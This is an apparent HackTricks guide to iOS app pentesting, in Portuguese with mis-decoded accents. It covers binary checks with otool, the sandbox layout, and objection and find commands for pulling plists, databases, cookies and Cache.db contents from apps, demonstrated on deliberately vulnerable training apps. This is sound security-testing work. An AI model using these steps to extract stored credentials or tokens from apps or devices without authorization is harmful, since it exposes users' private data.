# iOS Pentesting

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=ios-pentesting) para construir e **automatizar fluxos de trabalho** facilmente, impulsionados pelas **ferramentas** da comunidade **mais avan√ßadas** do mundo.\
Obtenha Acesso Hoje:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=ios-pentesting" %}

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>
{% endhint %}
{% endhint %}

## iOS Basics

{% content-ref url="ios-basics.md" %}
[ios-basics.md](ios-basics.md)
{% endcontent-ref %}

## Testing Environment

Nesta p√°gina voc√™ pode encontrar informa√ß√µes sobre o **simulador iOS**, **emuladores** e **jailbreaking:**

{% content-ref url="ios-testing-environment.md" %}
[ios-testing-environment.md](ios-testing-environment.md)
{% endcontent-ref %}

## Initial Analysis

### Basic iOS Testing Operations

Durante o teste **v√°rias opera√ß√µes ser√£o sugeridas** (conectar ao dispositivo, ler/escrever/enviar/baixar arquivos, usar algumas ferramentas...). Portanto, se voc√™ n√£o souber como realizar alguma dessas a√ß√µes, por favor, **comece a ler a p√°gina**:

{% content-ref url="basic-ios-testing-operations.md" %}
[basic-ios-testing-operations.md](basic-ios-testing-operations.md)
{% endcontent-ref %}

{% hint style="info" %}
Para os pr√≥ximos passos **o app deve estar instalado** no dispositivo e j√° deve ter obtido o **arquivo IPA** da aplica√ß√£o.\
Leia a p√°gina [Basic iOS Testing Operations](basic-ios-testing-operations.md) para aprender como fazer isso.
{% endhint %}

### Basic Static Analysis

√â recomendado usar a ferramenta [**MobSF**](https://github.com/MobSF/Mobile-Security-Framework-MobSF) para realizar uma An√°lise Est√°tica autom√°tica no arquivo IPA.

Identifica√ß√£o de **prote√ß√µes presentes no bin√°rio**:

*   **PIE (Position Independent Executable)**: Quando habilitado, o aplicativo √© carregado em um endere√ßo de mem√≥ria aleat√≥rio toda vez que √© iniciado, dificultando a previs√£o de seu endere√ßo de mem√≥ria inicial.

```bash
otool -hv <app-binary> | grep PIE   # Deve incluir a flag PIE
```
*   **Stack Canaries**: Para validar a integridade da pilha, um valor ‚Äòcan√°rio‚Äô √© colocado na pilha antes de chamar uma fun√ß√£o e √© validado novamente uma vez que a fun√ß√£o termina.

```bash
otool -I -v <app-binary> | grep stack_chk   # Deve incluir os s√≠mbolos: stack_chk_guard e stack_chk_fail
```
*   **ARC (Automatic Reference Counting)**: Para prevenir falhas comuns de corrup√ß√£o de mem√≥ria

```bash
otool -I -v <app-binary> | grep objc_release   # Deve incluir o s√≠mbolo _objc_release
```
*   **Binary Encriptado**: O bin√°rio deve estar encriptado

```bash
otool -arch all -Vl <app-binary> | grep -A5 LC_ENCRYPT   # O cryptid deve ser 1
```

**Identifica√ß√£o de Fun√ß√µes Sens√≠veis/Inseguras**

*   **Algoritmos de Hashing Fracos**

```bash
# No dispositivo iOS
otool -Iv <app> | grep -w "_CC_MD5"
otool -Iv <app> | grep -w "_CC_SHA1"

# No linux
grep -iER "_CC_MD5"
grep -iER "_CC_SHA1"
```
*   **Fun√ß√µes Aleat√≥rias Inseguras**

```bash
# No dispositivo iOS
otool -Iv <app> | grep -w "_random"
otool -Iv <app> | grep -w "_srand"
otool -Iv <app> | grep -w "_rand"

# No linux
grep -iER "_random"
grep -iER "_srand"
grep -iER "_rand"
```
*   **Fun√ß√£o ‚ÄòMalloc‚Äô Insegura**

```bash
# No dispositivo iOS
otool -Iv <app> | grep -w "_malloc"

# No linux
grep -iER "_malloc"
```
*   **Fun√ß√µes Inseguras e Vulner√°veis**

```bash
# No dispositivo iOS
otool -Iv <app> | grep -w "_gets"
otool -Iv <app> | grep -w "_memcpy"
otool -Iv <app> | grep -w "_strncpy"
otool -Iv <app> | grep -w "_strlen"
otool -Iv <app> | grep -w "_vsnprintf"
otool -Iv <app> | grep -w "_sscanf"
otool -Iv <app> | grep -w "_strtok"
otool -Iv <app> | grep -w "_alloca"
otool -Iv <app> | grep -w "_sprintf"
otool -Iv <app> | grep -w "_printf"
otool -Iv <app> | grep -w "_vsprintf"

# No linux
grep -R "_gets"
grep -iER "_memcpy"
grep -iER "_strncpy"
grep -iER "_strlen"
grep -iER "_vsnprintf"
grep -iER "_sscanf"
grep -iER "_strtok"
grep -iER "_alloca"
grep -iER "_sprintf"
grep -iER "_printf"
grep -iER "_vsprintf"
```

### Basic Dynamic Analysis

Confira a an√°lise din√¢mica que [**MobSF**](https://github.com/MobSF/Mobile-Security-Framework-MobSF) realiza. Voc√™ precisar√° navegar pelas diferentes visualiza√ß√µes e interagir com elas, mas ele ir√° interceptar v√°rias classes ao fazer outras coisas e preparar√° um relat√≥rio assim que voc√™ terminar.

### Listing Installed Apps

Use o comando `frida-ps -Uai` para determinar o **identificador do pacote** dos aplicativos instalados:
```bash
$ frida-ps -Uai
PID  Name                 Identifier
----  -------------------  -----------------------------------------
6847  Calendar             com.apple.mobilecal
6815  Mail                 com.apple.mobilemail
-  App Store            com.apple.AppStore
-  Apple Store          com.apple.store.Jolly
-  Calculator           com.apple.calculator
-  Camera               com.apple.camera
-  iGoat-Swift          OWASP.iGoat-Swift
```
### Enumera√ß√£o B√°sica & Hooking

Aprenda como **enumerar os componentes da aplica√ß√£o** e como **hookear m√©todos e classes** com objection:

{% content-ref url="ios-hooking-with-objection.md" %}
[ios-hooking-with-objection.md](ios-hooking-with-objection.md)
{% endcontent-ref %}

### Estrutura IPA

A estrutura de um **arquivo IPA** √© essencialmente a de um **pacote zipado**. Ao renomear sua extens√£o para `.zip`, ele pode ser **descompactado** para revelar seu conte√∫do. Dentro dessa estrutura, um **Bundle** representa uma aplica√ß√£o totalmente empacotada e pronta para instala√ß√£o. Dentro, voc√™ encontrar√° um diret√≥rio chamado `<NAME>.app`, que encapsula os recursos da aplica√ß√£o.

* **`Info.plist`**: Este arquivo cont√©m detalhes espec√≠ficos de configura√ß√£o da aplica√ß√£o.
* **`_CodeSignature/`**: Este diret√≥rio inclui um arquivo plist que cont√©m uma assinatura, garantindo a integridade de todos os arquivos no bundle.
* **`Assets.car`**: Um arquivo compactado que armazena arquivos de ativos, como √≠cones.
* **`Frameworks/`**: Esta pasta abriga as bibliotecas nativas da aplica√ß√£o, que podem estar na forma de arquivos `.dylib` ou `.framework`.
* **`PlugIns/`**: Isso pode incluir extens√µes para a aplica√ß√£o, conhecidas como arquivos `.appex`, embora nem sempre estejam presentes. \* [**`Core Data`**](https://developer.apple.com/documentation/coredata): √â usado para salvar os dados permanentes da sua aplica√ß√£o para uso offline, para armazenar dados tempor√°rios e para adicionar funcionalidade de desfazer √† sua aplica√ß√£o em um √∫nico dispositivo. Para sincronizar dados em v√°rios dispositivos em uma √∫nica conta do iCloud, o Core Data espelha automaticamente seu esquema para um cont√™iner do CloudKit.
* [**`PkgInfo`**](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPRuntimeConfig/Articles/ConfigApplications.html): O arquivo `PkgInfo` √© uma maneira alternativa de especificar os c√≥digos de tipo e criador da sua aplica√ß√£o ou bundle.
* **en.lproj, fr.proj, Base.lproj**: S√£o os pacotes de idioma que cont√™m recursos para esses idiomas espec√≠ficos e um recurso padr√£o caso um idioma n√£o seja suportado.
* **Seguran√ßa**: O diret√≥rio `_CodeSignature/` desempenha um papel cr√≠tico na seguran√ßa do aplicativo, verificando a integridade de todos os arquivos empacotados por meio de assinaturas digitais.
* **Gerenciamento de Ativos**: O arquivo `Assets.car` utiliza compress√£o para gerenciar eficientemente ativos gr√°ficos, crucial para otimizar o desempenho da aplica√ß√£o e reduzir seu tamanho total.
* **Frameworks e PlugIns**: Esses diret√≥rios destacam a modularidade das aplica√ß√µes iOS, permitindo que os desenvolvedores incluam bibliotecas de c√≥digo reutiliz√°veis (`Frameworks/`) e estendam a funcionalidade do aplicativo (`PlugIns/`).
* **Localiza√ß√£o**: A estrutura suporta v√°rios idiomas, facilitando o alcance global da aplica√ß√£o ao incluir recursos para pacotes de idiomas espec√≠ficos.

**Info.plist**

O **Info.plist** serve como uma pedra angular para aplica√ß√µes iOS, encapsulando dados de configura√ß√£o chave na forma de pares **chave-valor**. Este arquivo √© um requisito n√£o apenas para aplica√ß√µes, mas tamb√©m para extens√µes de aplicativos e frameworks empacotados dentro. Est√° estruturado em formato XML ou bin√°rio e cont√©m informa√ß√µes cr√≠ticas que v√£o desde permiss√µes de aplicativo at√© configura√ß√µes de seguran√ßa. Para uma explora√ß√£o detalhada das chaves dispon√≠veis, pode-se consultar a [**Documenta√ß√£o do Desenvolvedor Apple**](https://developer.apple.com/documentation/bundleresources/information\_property\_list?language=objc).

Para aqueles que desejam trabalhar com este arquivo em um formato mais acess√≠vel, a convers√£o para XML pode ser realizada facilmente atrav√©s do uso de `plutil` no macOS (dispon√≠vel nativamente nas vers√µes 10.2 e posteriores) ou `plistutil` no Linux. Os comandos para convers√£o s√£o os seguintes:

* **Para macOS**:
```bash
$ plutil -convert xml1 Info.plist
```
* **Para Linux**:
```bash
$ apt install libplist-utils
$ plistutil -i Info.plist -o Info_xml.plist
```
Entre a mir√≠ade de informa√ß√µes que o arquivo **Info.plist** pode divulgar, entradas not√°veis incluem strings de permiss√£o do aplicativo (`UsageDescription`), esquemas de URL personalizados (`CFBundleURLTypes`) e configura√ß√µes para a Seguran√ßa de Transporte de Aplicativos (`NSAppTransportSecurity`). Essas entradas, junto com outras como tipos de documentos personalizados exportados/importados (`UTExportedTypeDeclarations` / `UTImportedTypeDeclarations`), podem ser facilmente localizadas inspecionando o arquivo ou empregando um simples comando `grep`:
```bash
$ grep -i <keyword> Info.plist
```
**Caminhos de Dados**

No ambiente iOS, diret√≥rios s√£o designados especificamente para **aplica√ß√µes do sistema** e **aplica√ß√µes instaladas pelo usu√°rio**. Aplica√ß√µes do sistema residem no diret√≥rio `/Applications`, enquanto aplicativos instalados pelo usu√°rio s√£o colocados em `/var/mobile/containers/Data/Application/`. Essas aplica√ß√µes recebem um identificador √∫nico conhecido como **UUID de 128 bits**, tornando a tarefa de localizar manualmente a pasta de um aplicativo desafiadora devido √† aleatoriedade dos nomes dos diret√≥rios.

{% hint style="warning" %}
Como as aplica√ß√µes no iOS devem ser isoladas, cada aplicativo tamb√©m ter√° uma pasta dentro de **`$HOME/Library/Containers`** com o **`CFBundleIdentifier`** do aplicativo como o nome da pasta.

No entanto, ambas as pastas (dados e pastas de cont√™iner) possuem o arquivo **`.com.apple.mobile_container_manager.metadata.plist`** que vincula ambos os arquivos na chave `MCMetadataIdentifier`).
{% endhint %}

Para facilitar a descoberta do diret√≥rio de instala√ß√£o de um aplicativo instalado pelo usu√°rio, a **ferramenta objection** fornece um comando √∫til, `env`. Este comando revela informa√ß√µes detalhadas do diret√≥rio para o aplicativo em quest√£o. Abaixo est√° um exemplo de como usar este comando:
```bash
OWASP.iGoat-Swift on (iPhone: 11.1.2) [usb] # env

Name               Path
-----------------  -------------------------------------------------------------------------------------------
BundlePath         /var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app
CachesDirectory    /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Library/Caches
DocumentDirectory  /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Documents
LibraryDirectory   /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Library
```
Alternativamente, o nome do aplicativo pode ser pesquisado dentro de `/private/var/containers` usando o comando `find`:
```bash
find /private/var/containers -name "Progname*"
```
Comandos como `ps` e `lsof` tamb√©m podem ser utilizados para identificar o processo do aplicativo e listar arquivos abertos, respectivamente, fornecendo informa√ß√µes sobre os caminhos de diret√≥rio ativos do aplicativo:
```bash
ps -ef | grep -i <app-name>
lsof -p <pid> | grep -i "/containers" | head -n 1
```
**Diret√≥rio do pacote:**

* **AppName.app**
* Este √© o Pacote da Aplica√ß√£o, como visto anteriormente no IPA, cont√©m dados essenciais da aplica√ß√£o, conte√∫do est√°tico, bem como o bin√°rio compilado da aplica√ß√£o.
* Este diret√≥rio √© vis√≠vel para os usu√°rios, mas **os usu√°rios n√£o podem escrever nele**.
* O conte√∫do deste diret√≥rio **n√£o √© salvo**.
* O conte√∫do desta pasta √© usado para **validar a assinatura do c√≥digo**.

**Diret√≥rio de dados:**

* **Documents/**
* Cont√©m todos os dados gerados pelo usu√°rio. O usu√°rio final da aplica√ß√£o inicia a cria√ß√£o desses dados.
* Vis√≠vel para os usu√°rios e **os usu√°rios podem escrever nele**.
* O conte√∫do deste diret√≥rio **√© salvo**.
* O app pode desabilitar caminhos configurando `NSURLIsExcludedFromBackupKey`.
* **Library/**
* Cont√©m todos os **arquivos que n√£o s√£o espec√≠ficos do usu√°rio**, como **caches**, **prefer√™ncias**, **cookies** e arquivos de configura√ß√£o de lista de propriedades (plist).
* Aplicativos iOS geralmente usam os subdiret√≥rios `Application Support` e `Caches`, mas o app pode criar subdiret√≥rios personalizados.
* **Library/Caches/**
* Cont√©m **arquivos de cache semi-persistentes.**
* Invis√≠vel para os usu√°rios e **os usu√°rios n√£o podem escrever nele**.
* O conte√∫do deste diret√≥rio **n√£o √© salvo**.
* O sistema operacional pode excluir automaticamente os arquivos deste diret√≥rio quando o app n√£o est√° em execu√ß√£o e o espa√ßo de armazenamento est√° baixo.
* **Library/Application Support/**
* Cont√©m **arquivos** **persistentes** necess√°rios para a execu√ß√£o do app.
* **Invis√≠vel** **para** **os usu√°rios** e os usu√°rios n√£o podem escrever nele.
* O conte√∫do deste diret√≥rio **√© salvo**.
* O app pode desabilitar caminhos configurando `NSURLIsExcludedFromBackupKey`.
* **Library/Preferences/**
* Usado para armazenar propriedades que podem **persistir mesmo ap√≥s a reinicializa√ß√£o de uma aplica√ß√£o**.
* As informa√ß√µes s√£o salvas, sem criptografia, dentro do sandbox da aplica√ß√£o em um arquivo plist chamado \[BUNDLE\_ID].plist.
* Todos os pares chave/valor armazenados usando `NSUserDefaults` podem ser encontrados neste arquivo.
* **tmp/**
* Use este diret√≥rio para escrever **arquivos tempor√°rios** que n√£o precisam persistir entre as execu√ß√µes do app.
* Cont√©m arquivos de cache n√£o persistentes.
* **Invis√≠vel** para os usu√°rios.
* O conte√∫do deste diret√≥rio n√£o √© salvo.
* O sistema operacional pode excluir automaticamente os arquivos deste diret√≥rio quando o app n√£o est√° em execu√ß√£o e o espa√ßo de armazenamento est√° baixo.

Vamos dar uma olhada mais de perto no Pacote da Aplica√ß√£o do iGoat-Swift (.app) dentro do diret√≥rio do Pacote (`/var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app`):
```bash
OWASP.iGoat-Swift on (iPhone: 11.1.2) [usb] # ls
NSFileType      Perms  NSFileProtection    ...  Name
------------  -------  ------------------  ...  --------------------------------------
Regular           420  None                ...  rutger.html
Regular           420  None                ...  mansi.html
Regular           420  None                ...  splash.html
Regular           420  None                ...  about.html

Regular           420  None                ...  LICENSE.txt
Regular           420  None                ...  Sentinel.txt
Regular           420  None                ...  README.txt
```
### Binary Reversing

Dentro da pasta `<application-name>.app`, voc√™ encontrar√° um arquivo bin√°rio chamado `<application-name>`. Este √© o arquivo que ser√° **executado**. Voc√™ pode realizar uma inspe√ß√£o b√°sica do bin√°rio com a ferramenta **`otool`**:
```bash
otool -Vh DVIA-v2 #Check some compilation attributes
magic  cputype cpusubtype  caps    filetype ncmds sizeofcmds      flags
MH_MAGIC_64    ARM64        ALL  0x00     EXECUTE    65       7112   NOUNDEFS DYLDLINK TWOLEVEL WEAK_DEFINES BINDS_TO_WEAK PIE

otool -L DVIA-v2 #Get third party libraries
DVIA-v2:
/usr/lib/libc++.1.dylib (compatibility version 1.0.0, current version 400.9.1)
/usr/lib/libsqlite3.dylib (compatibility version 9.0.0, current version 274.6.0)
/usr/lib/libz.1.dylib (compatibility version 1.0.0, current version 1.2.11)
@rpath/Bolts.framework/Bolts (compatibility version 1.0.0, current version 1.0.0)
[...]
```
**Verifique se o aplicativo est√° criptografado**

Veja se h√° alguma sa√≠da para:
```bash
otool -l <app-binary> | grep -A 4 LC_ENCRYPTION_INFO
```
**Desmontando o bin√°rio**

Desmonte a se√ß√£o de texto:
```bash
otool -tV DVIA-v2
DVIA-v2:
(__TEXT,__text) section
+[DDLog initialize]:
0000000100004ab8    sub    sp, sp, #0x60
0000000100004abc    stp    x29, x30, [sp, #0x50]   ; Latency: 6
0000000100004ac0    add    x29, sp, #0x50
0000000100004ac4    sub    x8, x29, #0x10
0000000100004ac8    mov    x9, #0x0
0000000100004acc    adrp    x10, 1098 ; 0x10044e000
0000000100004ad0    add    x10, x10, #0x268
```
Para imprimir o **segmento Objective-C** do aplicativo de amostra, pode-se usar:
```bash
otool -oV DVIA-v2
DVIA-v2:
Contents of (__DATA,__objc_classlist) section
00000001003dd5b8 0x1004423d0 _OBJC_CLASS_$_DDLog
isa        0x1004423a8 _OBJC_METACLASS_$_DDLog
superclass 0x0 _OBJC_CLASS_$_NSObject
cache      0x0 __objc_empty_cache
vtable     0x0
data       0x1003de748
flags          0x80
instanceStart  8
```
Para obter um c√≥digo Objective-C mais compacto, voc√™ pode usar [**class-dump**](http://stevenygard.com/projects/class-dump/):
```bash
class-dump some-app
//
//     Generated by class-dump 3.5 (64 bit).
//
//     class-dump is Copyright (C) 1997-1998, 2000-2001, 2004-2013 by Steve Nygard.
//

#pragma mark Named Structures

struct CGPoint {
double _field1;
double _field2;
};

struct CGRect {
struct CGPoint _field1;
struct CGSize _field2;
};

struct CGSize {
double _field1;
double _field2;
};
```
No entanto, as melhores op√ß√µes para desassemblar o bin√°rio s√£o: [**Hopper**](https://www.hopperapp.com/download.html?) e [**IDA**](https://www.hex-rays.com/products/ida/support/download\_freeware/).

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=ios-pentesting) para construir e **automatizar fluxos de trabalho** facilmente, impulsionados pelas **ferramentas** da comunidade **mais avan√ßadas** do mundo.\
Acesse hoje:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=ios-pentesting" %}

## Armazenamento de Dados

Para aprender sobre como o iOS armazena dados no dispositivo, leia esta p√°gina:

{% content-ref url="ios-basics.md" %}
[ios-basics.md](ios-basics.md)
{% endcontent-ref %}

{% hint style="warning" %}
Os seguintes locais para armazenar informa√ß√µes devem ser verificados **logo ap√≥s a instala√ß√£o do aplicativo**, **ap√≥s verificar todas as funcionalidades** do aplicativo e at√© mesmo ap√≥s **sair de um usu√°rio e entrar em um diferente**.\
O objetivo √© encontrar **informa√ß√µes sens√≠veis n√£o protegidas** do aplicativo (senhas, tokens), do usu√°rio atual e de usu√°rios que se conectaram anteriormente.
{% endhint %}

### Plist

Os arquivos **plist** s√£o arquivos XML estruturados que **cont√™m pares chave-valor**. √â uma forma de armazenar dados persistentes, ent√£o √†s vezes voc√™ pode encontrar **informa√ß√µes sens√≠veis nesses arquivos**. √â recomendado verificar esses arquivos ap√≥s a instala√ß√£o do aplicativo e ap√≥s us√°-lo intensivamente para ver se novos dados s√£o escritos.

A forma mais comum de persistir dados em arquivos plist √© atrav√©s do uso de **NSUserDefaults**. Este arquivo plist √© salvo dentro do sandbox do aplicativo em **`Library/Preferences/<appBundleID>.plist`**

A classe [`NSUserDefaults`](https://developer.apple.com/documentation/foundation/nsuserdefaults) fornece uma interface program√°tica para interagir com o sistema padr√£o. O sistema padr√£o permite que um aplicativo personalize seu comportamento de acordo com as **prefer√™ncias do usu√°rio**. Os dados salvos pelo `NSUserDefaults` podem ser visualizados no pacote do aplicativo. Esta classe armazena **dados** em um **arquivo plist**, mas √© destinada a ser usada com pequenas quantidades de dados.

Esses dados n√£o podem ser acessados diretamente via um computador confi√°vel, mas podem ser acessados realizando um **backup**.

Voc√™ pode **extrair** as informa√ß√µes salvas usando **`NSUserDefaults`** com o comando `ios nsuserdefaults get` do objection.

Para encontrar todos os plist usados pelo aplicativo, voc√™ pode acessar `/private/var/mobile/Containers/Data/Application/{APPID}` e executar:
```bash
find ./ -name "*.plist"
```
Para converter arquivos do formato **XML ou bin√°rio (bplist)** para XML, v√°rios m√©todos dependendo do seu sistema operacional est√£o dispon√≠veis:

**Para usu√°rios do macOS:** Utilize o comando `plutil`. √â uma ferramenta embutida no macOS (10.2+), projetada para esse prop√≥sito:
```bash
$ plutil -convert xml1 Info.plist
```
**Para usu√°rios do Linux:** Instale `libplist-utils` primeiro, depois use `plistutil` para converter seu arquivo:
```bash
$ apt install libplist-utils
$ plistutil -i Info.plist -o Info_xml.plist
```
**Dentro de uma Sess√£o Objection:** Para analisar aplicativos m√≥veis, um comando espec√≠fico permite que voc√™ converta arquivos plist diretamente:
```bash
ios plist cat /private/var/mobile/Containers/Data/Application/<Application-UUID>/Library/Preferences/com.some.package.app.plist
```
### Core Data

[`Core Data`](https://developer.apple.com/library/content/documentation/Cocoa/Conceptual/CoreData/nsfetchedresultscontroller.html#//apple\_ref/doc/uid/TP40001075-CH8-SW1) √© um framework para gerenciar a camada de modelo de objetos em seu aplicativo. [Core Data pode usar SQLite como seu armazenamento persistente](https://cocoacasts.com/what-is-the-difference-between-core-data-and-sqlite/), mas o framework em si n√£o √© um banco de dados.\
CoreData n√£o criptografa seus dados por padr√£o. No entanto, uma camada de criptografia adicional pode ser adicionada ao CoreData. Veja o [GitHub Repo](https://github.com/project-imas/encrypted-core-data) para mais detalhes.

Voc√™ pode encontrar as informa√ß√µes do SQLite Core Data de um aplicativo no caminho `/private/var/mobile/Containers/Data/Application/{APPID}/Library/Application Support`

**Se voc√™ conseguir abrir o SQLite e acessar informa√ß√µes sens√≠veis, ent√£o voc√™ encontrou uma m√° configura√ß√£o.**

{% code title="Code from iGoat" %}
```objectivec
-(void)storeDetails {
AppDelegate * appDelegate = (AppDelegate *)(UIApplication.sharedApplication.delegate);

NSManagedObjectContext *context =[appDelegate managedObjectContext];

User *user = [self fetchUser];
if (user) {
return;
}
user = [NSEntityDescription insertNewObjectForEntityForName:@"User"
inManagedObjectContext:context];
user.email = CoreDataEmail;
user.password = CoreDataPassword;
NSError *error;
if (![context save:&error]) {
NSLog(@"Error in saving data: %@", [error localizedDescription]);

}else{
NSLog(@"data stored in core data");
}
}
```
{% endcode %}

### YapDatabase

[YapDatabase](https://github.com/yapstudios/YapDatabase) √© um armazenamento chave/valor constru√≠do sobre o SQLite.\
Como os bancos de dados Yap s√£o bancos de dados sqlite, voc√™ pode encontr√°-los usando o comando proposto na se√ß√£o anterior.

### Outros Bancos de Dados SQLite

√â comum que aplicativos criem seu pr√≥prio banco de dados sqlite. Eles podem estar **armazenando** **dados** **sens√≠veis** neles e deix√°-los n√£o criptografados. Portanto, √© sempre interessante verificar cada banco de dados dentro do diret√≥rio dos aplicativos. Portanto, v√° para o diret√≥rio do aplicativo onde os dados s√£o salvos (`/private/var/mobile/Containers/Data/Application/{APPID}`)
```bash
find ./ -name "*.sqlite" -or -name "*.db"
```
### Firebase Real-Time Databases

Os desenvolvedores podem **armazenar e sincronizar dados** dentro de um **banco de dados NoSQL hospedado na nuvem** atrav√©s do Firebase Real-Time Databases. Armazenados em formato JSON, os dados s√£o sincronizados para todos os clientes conectados em tempo real.

Voc√™ pode encontrar como verificar bancos de dados Firebase mal configurados aqui:

{% content-ref url="../../network-services-pentesting/pentesting-web/buckets/firebase-database.md" %}
[firebase-database.md](../../network-services-pentesting/pentesting-web/buckets/firebase-database.md)
{% endcontent-ref %}

### Realm databases

[Realm Objective-C](https://realm.io/docs/objc/latest/) e [Realm Swift](https://realm.io/docs/swift/latest/) oferecem uma alternativa poderosa para armazenamento de dados, n√£o fornecida pela Apple. Por padr√£o, eles **armazenam dados n√£o criptografados**, com criptografia dispon√≠vel atrav√©s de configura√ß√£o espec√≠fica.

Os bancos de dados est√£o localizados em: `/private/var/mobile/Containers/Data/Application/{APPID}`. Para explorar esses arquivos, pode-se utilizar comandos como:
```bash
iPhone:/private/var/mobile/Containers/Data/Application/A079DF84-726C-4AEA-A194-805B97B3684A/Documents root# ls
default.realm  default.realm.lock  default.realm.management/  default.realm.note|

$ find ./ -name "*.realm*"
```
Para visualizar esses arquivos de banco de dados, a ferramenta [**Realm Studio**](https://github.com/realm/realm-studio) √© recomendada.

Para implementar criptografia dentro de um banco de dados Realm, o seguinte trecho de c√≥digo pode ser usado:
```swift
// Open the encrypted Realm file where getKey() is a method to obtain a key from the Keychain or a server
let config = Realm.Configuration(encryptionKey: getKey())
do {
let realm = try Realm(configuration: config)
// Use the Realm as normal
} catch let error as NSError {
// If the encryption key is wrong, `error` will say that it's an invalid database
fatalError("Error opening realm: \(error)")
}
```
### Couchbase Lite Databases

[Couchbase Lite](https://github.com/couchbase/couchbase-lite-ios) √© descrito como um mecanismo de banco de dados **leve** e **embutido** que segue a abordagem **orientada a documentos** (NoSQL). Projetado para ser nativo do **iOS** e **macOS**, oferece a capacidade de sincronizar dados de forma cont√≠nua.

Para identificar potenciais bancos de dados Couchbase em um dispositivo, o seguinte diret√≥rio deve ser inspecionado:
```bash
ls /private/var/mobile/Containers/Data/Application/{APPID}/Library/Application Support/
```
### Cookies

iOS armazena os cookies dos aplicativos em **`Library/Cookies/cookies.binarycookies`** dentro da pasta de cada aplicativo. No entanto, os desenvolvedores √†s vezes decidem salv√°-los no **keychain**, pois o mencionado **arquivo de cookie pode ser acessado em backups**.

Para inspecionar o arquivo de cookies, voc√™ pode usar [**este script python**](https://github.com/mdegrazia/Safari-Binary-Cookie-Parser) ou usar o **`ios cookies get`** do objection.\
**Voc√™ tamb√©m pode usar o objection para** converter esses arquivos para um formato JSON e inspecionar os dados.
```bash
...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # ios cookies get --json
[
{
"domain": "highaltitudehacks.com",
"expiresDate": "2051-09-15 07:46:43 +0000",
"isHTTPOnly": "false",
"isSecure": "false",
"name": "username",
"path": "/",
"value": "admin123",
"version": "0"
}
]
```
### Cache

Por padr√£o, o NSURLSession armazena dados, como **requisi√ß√µes e respostas HTTP no banco de dados Cache.db**. Este banco de dados pode conter **dados sens√≠veis**, se tokens, nomes de usu√°rio ou qualquer outra informa√ß√£o sens√≠vel tiver sido armazenada em cache. Para encontrar as informa√ß√µes em cache, abra o diret√≥rio de dados do aplicativo (`/var/mobile/Containers/Data/Application/<UUID>`) e v√° para `/Library/Caches/<Bundle Identifier>`. O **cache do WebKit tamb√©m est√° sendo armazenado no arquivo Cache.db**. **Objection** pode abrir e interagir com o banco de dados com o comando `sqlite connect Cache.db`, pois √© um **banco de dados SQLite normal**.

√â **recomendado desabilitar o armazenamento em cache desses dados**, pois pode conter informa√ß√µes sens√≠veis na requisi√ß√£o ou resposta. A lista a seguir mostra diferentes maneiras de alcan√ßar isso:

1.  √â recomendado remover as respostas em cache ap√≥s o logout. Isso pode ser feito com o m√©todo fornecido pela Apple chamado [`removeAllCachedResponses`](https://developer.apple.com/documentation/foundation/urlcache/1417802-removeallcachedresponses). Voc√™ pode chamar este m√©todo da seguinte forma:

`URLCache.shared.removeAllCachedResponses()`

Este m√©todo remover√° todas as requisi√ß√µes e respostas em cache do arquivo Cache.db.
2.  Se voc√™ n√£o precisar usar a vantagem dos cookies, seria recomendado usar a propriedade de configura√ß√£o [.ephemeral](https://developer.apple.com/documentation/foundation/urlsessionconfiguration/1410529-ephemeral) do URLSession, que desabilitar√° o salvamento de cookies e caches.

[Documenta√ß√£o da Apple](https://developer.apple.com/documentation/foundation/urlsessionconfiguration/1410529-ephemeral):

`Um objeto de configura√ß√£o de sess√£o ef√™mera √© semelhante a uma configura√ß√£o de sess√£o padr√£o (veja padr√£o), exceto que o objeto de sess√£o correspondente n√£o armazena caches, armazenamentos de credenciais ou quaisquer dados relacionados √† sess√£o no disco. Em vez disso, os dados relacionados √† sess√£o s√£o armazenados na RAM. A √∫nica vez que uma sess√£o ef√™mera grava dados no disco √© quando voc√™ diz para ela gravar o conte√∫do de uma URL em um arquivo.`
3. O cache tamb√©m pode ser desabilitado definindo a Pol√≠tica de Cache como [.notAllowed](https://developer.apple.com/documentation/foundation/urlcache/storagepolicy/notallowed). Isso desabilitar√° o armazenamento de cache de qualquer forma, seja na mem√≥ria ou no disco.

### Snapshots

